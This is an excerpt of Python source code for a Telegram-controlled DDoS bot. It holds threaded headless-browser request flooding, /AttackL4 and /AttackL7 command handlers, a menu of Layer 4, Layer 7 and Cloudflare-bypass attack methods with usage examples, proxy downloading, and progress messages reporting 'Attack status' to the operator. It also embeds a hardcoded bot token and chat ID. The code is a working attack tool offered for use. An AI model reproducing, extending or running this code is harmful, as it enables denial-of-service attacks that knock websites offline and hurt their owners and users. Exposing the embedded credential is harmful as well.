...
token = '7335279518:AAGJhW1glPzf46GFi_zwuTkFleoqoeU8-2M'
chat_id = '1077368861'
...
def LaunchBROWSER(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackBROWSER, args=(url, until))
            thd.start()
        except:
            pass

def AttackBROWSER(url, until_datetime):
    options = webdriver.ChromeOptions()
    arguments = [
        '--no-sandbox', '--disable-setuid-sandbox', '--disable-infobars', '--disable-logging', '--disable-login-animations',
        '--disable-notifications', '--disable-gpu', '--headless', '--lang=en_US', '--start-maximized',
    ...
    try:
        ...
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                ...
                driver.get(url)  # Send multiple requests
            except:
                pass
        driver.quit()
    except Exception as e:
...
def countdown(t):
    ...
    for i in range(int(t), 0, -1):
        time.sleep(1)
        edit = requests.get(url + f'editMessageText?chat_id={chat_id}&message_id={message_id}&text=<b>Attack status => <i>{i}</i> sec left\nCPU pressure : {psutil.virtual_memory().percent}</b>&parse_mode=HTML')
...
def InfoL7(URL=None, METHOD=None, THREAD=None, TIME=None):
    ...
    try:
        ...
        t = int(t)
        if thread <= 0 or t <= 0:
            send_message("<b>Error: Threads and time must be positive integers!</b>", mode="HTML")
            return
        if thread > 5000:  # Limit threads to prevent crashes
            thread = 5000
            send_message("<b>Warning: Threads limited to 100 to prevent system overload.</b>", mode="HTML")
    except ValueError:
        send_message("<b>Error: Threads and time must be valid integers!</b>", mode="HTML")
        return
    if command == "test":
        ...
        if get_cookie(target):
            ...
            send_message("<b>Failed to bypass Cloudflare!</b>", mode="HTML")
        ...
        send_message("<b>Starting BROWSER attack... (Max 20s for initialization)</b>", mode="HTML")
        timer = threading.Thread(target=countdown, args=(t,))
        timer.start()
        LaunchBROWSER(target, thread, t)
        timer.join()
...
def ping_website(message):
    ...
    if len(command_parts) < 2:
        bot.reply_to(message, "Error: Please provide a website to ping. Usage: /ping <website> (e.g., /ping google.com)")
        return
    ...
    try:
        ...
        try:
            ...
            bot.reply_to(message, f"Error in pinging {website}!")
    except subprocess.SubprocessError:
        bot.reply_to(message, f"Error: Failed to execute ping command for {website}")

@bot.message_handler(commands=['proxy'])
def proxy(message):
    command_parts = message.text.split(' ')
    if len(command_parts) < 2:
        bot.reply_to(message, "Error: Please specify proxy type. Usage: /proxy <SOCKS5 or HTTP>")
        return
    TYPE = command_parts[1].upper()
    DOWNLOAD(typ=TYPE)
...
def AttackL4(message):
    ...
    if not all([url, method, port, thread, time]):
        bot.reply_to(message, "Error: Missing required parameters. Usage: /AttackL4 -url <url> -method <method> -port <port> -thread <threads> -time <time>")
        return
    try:
        thread = int(thread)
        time = int(time)
        if thread <= 0 or time <= 0:
            bot.reply_to(message, "Error: Threads and time must be positive integers!")
            return
        if thread > 5000:
            thread = 100
            bot.reply_to(message, "Warning: Threads limited to 100 to prevent system overload.")
    except ValueError:
        bot.reply_to(message, "Error: Threads and time must be valid integers!")
        return
    send_message(f"<b>Starting Layer 4 Attack:</b>\nURL: {url}\nMethod: {method}\nPort: {port}\nThreads: {thread}\nTime: {time}")

@bot.message_handler(commands=['AttackL7'])
def AttackL7(message):
    url, method, thread, time = '', '', '', ''
    command_parts = message.text.split(' ')
    for i in range(1, len(command_parts) - 1, 2):
        if command_parts[i] == '-url':
            url = command_parts[i + 1]
            ...
            time = command_parts[i + 1]
    if not all([url, method, thread, time]):
        bot.reply_to(message, "Error: Missing required parameters. Usage: /AttackL7 -url <url> -method <method> -thread <threads> -time <time>")
        return
    try:
        thread = int(thread)
        time = int(time)
...
h = f"""
<b>𒊹︎Layer 7 attack methods: [<i>SKY,HTTP2,PXHTTP2,SPOOF,POST,GET,HEAD,PXRAW,PXSOC,SOC,BROWSER</i>]\n
𒊹︎Layer 4 attack methods: [<i>UDP,TCP,SYN,RUDPP,NUDPP</i>]\n
𒊹︎Bypass: [<i>PXSKY,CFSOC,CFREQ,PXCFB,CFB,BROWSER</i>]\n
𒊹︎Download Proxy: [<i>SOCKS5,HTTP</i>]</b>\n
"""
h2 = """
<b>How To Attack Layer 7</b>: <i>/AttackL7 -url https://example.com -method BROWSER -thread 10 -time 60</i>\n
<b>How To Attack Layer 4</b>: <i>/AttackL4 -url https://example.com -method TCP -port 80 -thread 100 -time 50</i>\n
<b>How Get Proxy</b>: <i>/proxy [SOCKS5 or HTTP]</i>\n
<b>How Get Ping</b>: <i>/ping google.com</i>\n
<b>BOT</b>: <i>@MasterBhaiyaa</i>\n
"""
...
# Check for useragent.txt file before loading
if not os.path.exists('useragent.txt'):
    print("Error: useragent.txt file not found. Creating a default one.")
